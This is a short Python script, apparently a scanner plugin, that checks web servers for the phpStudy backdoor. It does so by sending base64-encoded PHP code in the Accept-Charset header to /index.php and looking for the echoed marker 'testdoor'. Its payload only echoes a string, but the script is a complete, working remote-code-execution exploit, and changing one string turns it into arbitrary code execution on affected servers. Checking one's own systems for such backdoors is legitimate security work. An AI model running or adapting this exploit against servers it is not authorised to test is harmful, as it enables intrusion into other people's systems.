#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpstudy后门
referer: unknown
author: qianxiao996
description: phpstudy后门探测
'''
import sys
import requests
import warnings
import base64


class phpstudy_backdoor:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['phpstudy后门', '', '']
        payload = "echo \"testdoor\";"
        payload = base64.b64encode(payload.encode('utf-8'))
        payload = str(payload, 'utf-8')
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'accept-charset': payload,
            'Accept-Encoding': 'gzip,deflate',
            'Connection': 'close',
        }
        try:
            req = requests.get(url=self.url+'/index.php', headers=headers, verify=False,timeout=30)
            if "testdoor" in req.text:
                result[2]=  '存在'
            else:
                result[2]=  '不存在'
        except:
            result[2]=  '不存在'
        # print(result)
        return result


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = phpstudy_backdoor(sys.argv[1])
    testVuln.run()